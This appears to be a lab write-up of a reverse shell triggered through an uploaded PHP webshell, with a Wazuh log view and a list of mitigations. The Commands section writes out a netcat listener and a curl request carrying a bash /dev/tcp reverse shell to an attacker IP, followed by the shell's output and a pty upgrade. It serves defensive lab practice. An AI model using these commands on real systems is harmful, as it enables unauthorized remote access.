# 04 — Reverse Shell

## Objective

Demonstrate command and control from the uploaded webshell back to the isolated Kali attacker machine.

## Commands

Start the listener on Kali with `nc` (Netcat):

```bash
nc -lvnp 4444
```

Trigger the reverse shell through the webshell:

```bash
curl -G "http://10.10.10.1:80/uploads/malicious.php" --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"'

```

## Execution and expected result

The listener should receive a shell running with the privileges of the web application process.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [192.168.1.2] 59990
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu-server:~/html/uploads$ ls
ls
malicious.php
www-data@ubuntu-server:~/html/uploads$ cd ..
cd ..
www-data@ubuntu-server:~/html$ ls
ls
done.txt
index.nginx-debian.html
upload.php
uploads
```
However we can still upgrade the terminal by executing a python command on the reverse shell `Netcat`:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Wazuh view

```json
{
  "ip": "10.10.20.10",
  "name": "reverse-proxy",
  "protocol": "GET",
  "srcip": "10.10.10.10",
  "full_log": "10.10.10.10 - - [14/Oct/2026:22:40:12 +0000] \"GET /uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22 HTTP/1.1\" 504 176 \"-\" \"curl/8.22.0\"",
}
```
The Nginx log records a **504 Gateway Timeout**, this is expected: 
Nginx waits for a response from the upstream Flask/PHP process, 
but the reverse shell holds the connection open indefinitely, 
causing Nginx to timeout. The timeout itself is a detection signal 
for an unusually long-running request.
## Mitigation

- Restrict outbound traffic from the application host with network policies.
- Run the application with a dedicated, unprivileged service account.
- Use an application server configuration that cannot execute uploaded files.
- Alert on shell processes and unexpected outbound connections.
- Keep the DMZ-to-LAN and LAN-to-WAN firewall rules deny-by-default.